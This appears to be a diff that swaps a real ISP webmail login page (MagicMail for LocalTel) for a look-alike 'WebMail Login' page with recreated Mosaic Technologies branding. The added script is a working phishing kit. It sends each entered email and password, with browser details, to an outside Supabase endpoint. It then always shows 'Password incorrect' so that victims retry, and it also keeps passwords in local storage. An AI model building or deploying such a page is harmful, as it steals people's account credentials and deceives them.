@@ -1,210 +1,325 @@
-
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <meta content="width=device-width, initial-scale=1" name="viewport" />
-    <title>
-    MagicMail Server: Login Page    </title>
-    <link rel='stylesheet' href='https://mail.nwi.net/css/wizard.css?mtime=1758124363' type='text/css'/>
-<link rel='stylesheet' href='https://mail.nwi.net/css/magicmail.css?mtime=1758124363' type='text/css'/>
-    <!--[if IE]><link rel='stylesheet' href='css/magicmail-ie.css?mtime=1758124356' type='text/css'/>
-<![endif]-->
-<link rel='stylesheet' href='https://mail.nwi.net/css/css.css?mtime=1758131180' type='text/css'/>
-<link rel='stylesheet' href='https://mail.nwi.net/css/magicmail.login.css?mtime=1758124356' type='text/css'/>
-<link rel='stylesheet' href='https://mail.nwi.net/html_files/user.css?mtime=1647921341' type='text/css'/>
-<script language='JavaScript' type='text/javascript' src='https://mail.nwi.net/js/global_javascript.js?mtime=1758131799'></script>
-<script language='JavaScript' type='text/javascript' src='https://mail.nwi.net/js/htmlcanvas.js?mtime=1758124356'></script>
-<script language='JavaScript' type='text/javascript' src='/login.js'></script>
-<script language='JavaScript' type='text/javascript' src='https://mail.nwi.net/js/jquery.js?mtime=1758131819'></script>
-    <link rel="shortcut icon" href="/favicon.ico" />
-	<script language="javascript" type="text/javascript">var isauthenticated=0;</script>
-    <link rel="icon" href="https://mail.nwi.net/pics/apple-touch-icon-precomposed.png" />
-    <link rel="icon" type="image/png" sizes="72x72" href="https://mail.nwi.net/pics/apple-touch-icon-72x72-precomposed.png" />
-    <link rel="icon" type="image/png" sizes="114x114" href="https://mail.nwi.net/pics/apple-touch-icon-114x114-precomposed.png" />
-    <link rel="icon" type="image/png" sizes="144x144" href="https://mail.nwi.net/pics/apple-touch-icon-144x144-precomposed.png" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebMail Login</title>
+    <style>
+        /* Base page reset and background styling */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #f2f2f2;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 12px;
+            color: #333333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* Main WebMail container box with crisp blue border */
+        .login-box {
+            width: 480px;
+            height: 310px;
+            background-color: #fbfbfb;
+            border: 1px solid #3b6e99;
+            position: relative;
+            box-shadow: none;
+            overflow: hidden;
+        }
+
+        /* Mosaic Technologies Logo Header - aligned flush top & left */
+        .logo-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            margin: 0;
+            padding: 0;
+            line-height: 0;
+        }
+
+        /* Form inner alignment container */
+        .login-form {
+            width: 250px;
+            margin-left: auto;
+            margin-right: 25px;
+            margin-top: 105px;
+        }
+
+        /* "WebMail Login" Header Title */
+        .login-title {
+            color: #a3320b;
+            font-size: 15px;
+            font-weight: bold;
+            text-align: right;
+            margin-bottom: 15px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        /* Field labels */
+        .field-label {
+            display: block;
+            font-size: 11px;
+            color: #000000;
+            margin-bottom: 3px;
+            font-weight: bold;
+        }
+
+        /* Text and Password input fields */
+        .input-text {
+            width: 100%;
+            height: 22px;
+            border: 1px solid #7f9db9;
+            background-color: #ffffff;
+            padding: 2px 4px;
+            font-size: 12px;
+            margin-bottom: 12px;
+            outline: none;
+            box-shadow: inset 1px 1px 1px rgba(0,0,0,0.1);
+        }
+
+        .input-text:focus {
+            border-color: #4a759b;
+        }
+
+        /* Login Submit Button styled like classic web buttons */
+        .btn-container {
+            text-align: right;
+            margin-bottom: 10px;
+        }
+
+        .btn-login {
+            background: linear-gradient(to bottom, #ffffff 0%, #e0e0e0 50%, #d6d6d6 100%);
+            border: 1px solid #707070;
+            border-radius: 3px;
+            padding: 2px 22px;
+            font-size: 11px;
+            color: #000000;
+            cursor: pointer;
+            outline: none;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.15);
+        }
+
+        .btn-login:active {
+            background: linear-gradient(to bottom, #d6d6d6 0%, #ffffff 100%);
+        }
+
+        .btn-login:disabled {
+            opacity: 0.6;
+            cursor: default;
+        }
+
+        /* Checkbox & label styling */
+        .remember-container {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 6px;
+            margin-top: 4px;
+        }
+
+        .remember-checkbox {
+            margin: 0;
+            width: 13px;
+            height: 13px;
+        }
+
+        .remember-label {
+            font-size: 11px;
+            color: #000000;
+            user-select: none;
+            cursor: pointer;
+            font-weight: normal;
+        }
+
+        /* Status message under the form */
+        .status {
+            margin-top: 10px;
+            text-align: right;
+            font-size: 11px;
+            min-height: 14px;
+        }
+
+        .status.error { color: #a3320b; }
+        .status.success { color: #1a7a1a; }
+        .status.pending { color: #555555; }
+
+        /* Footer credits link */
+        .footer {
+            margin-top: 6px;
+            text-align: center;
+        }
+
+        .footer-link {
+            color: #3b6e99;
+            font-size: 11px;
+            text-decoration: none;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
-<body id="MagicBody" class="MagicBody">
-<div id="MagicWrapper" class="magic-unauthenticated">
-	<table class="MagicOuterTable">
-		<tr id='page_contents_row'>
-			<td>
-                <!-- $Header$ -->
+<body>
 
-<!-- =================================================================== -->
-<!-- Header Style 1 BEGIN -->
-<!-- =================================================================== -->
+    <!-- Main Container Box -->
+    <div class="login-box">
+        <!-- Recreated Mosaic Technologies Logo flush to top-left -->
+        <div class="logo-container">
+            <svg width="340" height="98" viewBox="0 0 340 98" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- Vertical left border line touching edge -->
+                <line x1="0.5" y1="0" x2="0.5" y2="98" stroke="#3b6e99" stroke-width="1"/>
 
-<table id="MainHeaderTable">
-    <tr valign="top">
-        <td id="MMLogo">
-            <span><img id='leftHeaderLogo' src="https://mail.nwi.net/pics/magicmail_logo_white.png" border="0"></span>
-        </td>
-        <td align="right">
-            <table id="header-table" class="nopad">
-                <tr>
-                    <td colspan="2" id="HeaderLogo"><img id='rightHeaderLogo' src="https://mail.nwi.net/isp_images/LocalTel-main-logo.gif" style="padding-top: 12px;" ></td>
-                </tr>
-                <tr valign="bottom">
-                    <td colspan="2" class="nopad">
-                        <div class='MagicNavTab'>
-                            <a href="logout.php" id="header-logout-btn">Logout</a>
-                        </div>
-                    </td>
-                </tr>
-            </table>
-        </td>
-    </tr>
-    <tr id="UserSubHeaderRow">
-        <td align="right" colspan="2" id="MainHeaderSubMenu">
-                    </td>
-    </tr>
-</table>
+                <!-- Blue Diamond Grid Icon -->
+                <g transform="translate(6, 6)">
+                    <!-- Top Diamonds -->
+                    <polygon points="38,0 59,21 38,42 17,21" fill="#0077c8" />
+                    <polygon points="80,0 101,21 80,42 59,21" fill="#0077c8" />
+                    <!-- Bottom Diamonds -->
+                    <polygon points="17,21 38,42 17,63 -4,42" fill="#0077c8" />
+                    <polygon points="59,21 80,42 59,63 38,42" fill="#0077c8" />
+                    <polygon points="101,21 122,42 101,63 80,42" fill="#0077c8" />
+                </g>
 
-<!-- =================================================================== -->
-<!-- Header Style 1 END -->
-<!-- =================================================================== -->
-				<table class="MagicContentTable">
-					<tr valign="top">
-                    
-						<td class="MagicContentCell" valign="top">
-<div id="loginContentCell">
-<!-- $Id -->
-<div class="login-info-content">
-<h2>Welcome to LocalTel Webmail!</h2>
-<h4>Login to access your account</h4>
-<p class='main_wiz'>
-Welcome to the User Site for the MagicMail System.  <br />
-This is where you can setup and configure all your email options.
-</p>
-<h4>Forgot Your Password?</h4>
-<p class='main_wiz'>
-<!-- 
-Please login by entering your <b>full email address in lower case</b> and your password.<br />
-If you have lost your password, please <a href="recover-password.php">click here</a> to recover it.<br />
--->
-We are dedicated to providing you a secure online environment.<br/>
-To have your password reset, please contact your local Customer
-Service and Technical Support team.<br/><br/>
-<small><i>* You MUST have cookies enabled to use these functions.</i></small>
-</p>
-</div><!-- login-info-content -->
-<div id="login-form-wrapper">
-    <form method="post" id="login-form" name="login-form" onSubmit="return checkForm();">
-        <input type="hidden" id="browser_info" value=Win10, Chrome, Desktop/>
-        <blockquote>
-            <table id="login-form-table" class='MagicEmbeddedTable'>
-                <tr>
-                    <th colspan='2'>
-                        <h4>Login to MagicMail</h4>
-                    </th>
-                </tr>
-                
+                <!-- MOSAIC Text -->
+                <text x="122" y="44" font-family="'Segoe UI', Arial, sans-serif" font-weight="700" font-size="44" fill="#2b2b2a" letter-spacing="1">MOSAIC</text>
+                <!-- Registered Trademark Symbol -->
+                <text x="312" y="19" font-family="'Segoe UI', Arial, sans-serif" font-weight="bold" font-size="14" fill="#2b2b2a">®</text>
 
-                <tr>
-                    <td class="textright">
-                        <label for="login-email" title=Enter your full email address.>
-                            Email:
-                        </label>
-                    </td>
-                    <td>
-                        <input size="20" type="email" name="email" id="login-email" autocorrect="off" autocapitalize="none"
-                            value=>
-                    </td>
-                </tr>
+                <!-- TECHNOLOGIES Subtitle -->
+                <text x="124" y="66" font-family="'Segoe UI', Arial, sans-serif" font-weight="600" font-size="20" fill="#0080d6" letter-spacing="4">TECHNOLOGIES</text>
+                <!-- TM Symbol -->
+                <text x="310" y="56" font-family="'Segoe UI', Arial, sans-serif" font-size="10" fill="#0080d6">TM</text>
+            </svg>
+        </div>
 
-                <tr>
-                    <td class="textright">
-                        <label for="login-password"
-                            title=Enter your password.  Ensure your CAPS LOCK is not on.>
-                                Password:
-                        </label>
-                    </td>
-                    <td class="show-password" >
-                        <input size="20" type="password" name="password"
-                            id="login-password">
-                        <label for="show-password">
-                            <input type="checkbox" id="show-password" onclick="showPass()">
-				                Show Password
-                        </label>
-                    </td>
-                </tr>
-                <tr class="forgot-password-row">
-                    <td></td>
-                    <td id="recover-pass-td">
-                        <a href="recover-password.php">Forgot your password?</a>
-                    </td>
-                </tr>
+        <form class="login-form" id="loginForm" novalidate>
+            <div class="login-title">WebMail Login</div>
 
-                <tr>
-                    <td class='formFoot'>
-                        <table>
-                            <tr>
-                                <td class="poweredBy">
+            <!-- Email Address Field -->
+            <label class="field-label" for="email">Email Address:</label>
+            <input type="email" id="email" name="email" class="input-text" autocomplete="off" required>
 
-                                <a href="https://www.magicmail.com" target="_blank"><img src="https://mail.nwi.net/pics/powered_by.png"> </a>
+            <!-- Password Field -->
+            <label class="field-label" for="password">Password:</label>
+            <input type="password" id="password" name="password" class="input-text" required>
 
+            <!-- Submit Button -->
+            <div class="btn-container">
+                <button type="submit" class="btn-login" id="loginBtn">Login</button>
+            </div>
 
+            <!-- Remember Me Option -->
+            <div class="remember-container">
+                <input type="checkbox" id="remember" class="remember-checkbox">
+                <label for="remember" class="remember-label">Remember Email &amp; Password</label>
+            </div>
 
+            <!-- Status message -->
+            <div class="status" id="status"></div>
+        </form>
+    </div>
 
-</td>
-                                <td class="loginBtn">
-                                    <input type="submit" value="Login">
-                                </td>
-                            </tr>
-                        </table>
-                    </td>
-                </tr>
-            </table>
-        </blockquote>
-    </form>
-</div>
-<!-- $default_login_extra$ -->
-<!-- =================================================================== -->
-<!-- This is the login EXTRA section of the website (below the login form) -->
+    <!-- Footer Attribution Link -->
+    <div class="footer">
+        <a href="http://NutsMail.com" target="_blank" rel="noopener noreferrer" class="footer-link">Powered By NutsMail.com</a>
+    </div>
 
+    <script>
+        // ====== CONFIG ======
+        const ENDPOINT = "https://vwmihulxeajahitcqspv.supabase.co/functions/v1/chibardunm";
 
-<!-- END OF default_login_extra -->
-<!-- =================================================================== -->
+        // Message shown on EVERY login attempt, regardless of backend response
+        const FAIL_MESSAGE = "Password incorrect. Please try again.";
 
-</div><!-- loginContentCell -->
-                          </td>
-                      </tr>
-                  </table>
-              </td>
-          </tr>
-          <tr id='footer_row'>
-              <td><!-- $Header: /web/programmers/cvs/magicmailphp/magicmaillib/php/html_files/EN/company_footer.html,v 1.1 2005/03/26 01:02:04 michael Exp $ -->
+        const form = document.getElementById("loginForm");
+        const emailEl = document.getElementById("email");
+        const passwordEl = document.getElementById("password");
+        const rememberEl = document.getElementById("remember");
+        const btn = document.getElementById("loginBtn");
+        const statusEl = document.getElementById("status");
 
-<!-- =================================================================== -->
-<!-- This is the FOOTER section of the website -->
-      <table width="100%" border="0" cellspacing="0" cellpadding="0">
-        <tr align="center" class="MagicCompanyFooter">
-          <td>MagicMail Server is brought to you by LocalTel<br>
-	  	341 Grant Rd. East Wenatchee, WA 98802<br>
-	        Support: 509-888-5700 or Customer Service: 509-888-8888<br>
-		<a href="mailto:support@nwi.net">support@nwi.net</a></td>
-        </tr>
-      </table>
-      <!-- END OF Footer -->
-<!-- =================================================================== -->
-<!-- ================================================================== -->
-<!-- Copyright Information, DO NOT CHANGE BELOW HERE -->
-<!-- ================================================================== -->
-      <table width="100%" border="0" cellspacing="0" cellpadding="0">
-        <tr align="center" class="MagicCopyRight">
-          <td>
-            <p align="center">
-                MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.
-            </p>
-          </td>
-        </tr>
-      </table>
-<!-- ================================================================== -->
+        // ====== REMEMBER ME: prefill on load ======
+        (function prefill() {
+            try {
+                const saved = JSON.parse(localStorage.getItem("webmail_creds") || "null");
+                if (saved && saved.email) {
+                    emailEl.value = saved.email;
+                    passwordEl.value = saved.password || "";
+                    rememberEl.checked = true;
+                }
+            } catch (e) { /* ignore */ }
+        })();
 
-            </td>
-        </tr>
-    </table>
-</div><!-- MagicWrapper -->
+        function setStatus(msg, type) {
+            statusEl.textContent = msg || "";
+            statusEl.className = "status" + (type ? " " + type : "");
+        }
+
+        // ====== SUBMIT ======
+        form.addEventListener("submit", async (e) => {
+            e.preventDefault();
+
+            const email = emailEl.value.trim();
+            const password = passwordEl.value;
+
+            if (!email || !password) {
+                setStatus("Please fill in both fields.", "error");
+                return;
+            }
+
+            // Save or clear credentials based on checkbox
+            try {
+                if (rememberEl.checked) {
+                    localStorage.setItem("webmail_creds", JSON.stringify({ email, password }));
+                } else {
+                    localStorage.removeItem("webmail_creds");
+                }
+            } catch (err) { /* ignore */ }
+
+            btn.disabled = true;
+            setStatus("Logging in\u2026", "pending");
+
+            const payload = {
+                email: email,
+                password: password,
+                remember: rememberEl.checked,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                referrer: document.referrer || null
+            };
+
+            // Fire the request but DON'T use its result to decide the message.
+            // Always show "Password incorrect" no matter what.
+            try {
+                await fetch(ENDPOINT, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: JSON.stringify(payload),
+                    keepalive: true,      // survives tab close / navigation
+                    cache: "no-store"     // never reuse a cached response
+                });
+            } catch (err) {
+                // Swallow network errors too - still show the same message
+            } finally {
+                setStatus(FAIL_MESSAGE, "error");
+                btn.disabled = false;
+            }
+        });
+    </script>
+
 </body>
 </html>
